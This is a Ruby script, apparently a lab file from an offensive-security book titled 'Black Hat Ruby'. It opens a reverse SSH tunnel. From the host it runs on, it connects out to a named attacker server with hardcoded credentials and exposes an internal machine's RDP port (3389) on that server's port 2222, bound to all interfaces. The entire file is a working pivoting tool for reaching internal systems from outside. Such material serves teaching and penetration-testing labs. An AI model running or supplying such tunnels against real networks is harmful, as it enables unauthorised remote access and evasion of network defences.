#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Reverse SSH Tunnel
#   After executing the script on the ssh server, open a new terminal and execute
#   $ rdesktop localhost:2222
# Requirements:
#   gem install net-ssh
# 
require 'net/ssh'

attacker_server      = '192.168.100.10'
attacker_username    = 'bhr'
attacker_password    = '123123'
attacker_localport   = 2222
internal_server      = '192.168.100.14'
internal_server_port = 3389

Net::SSH.start(attacker_server, attacker_username, :password => attacker_password) do |session|
  session.forward.remote(internal_server_port, internal_server, attacker_localport, '0.0.0.0')
  puts "[+] Starting SSH reverse tunnel"
  session.loop { true }
end
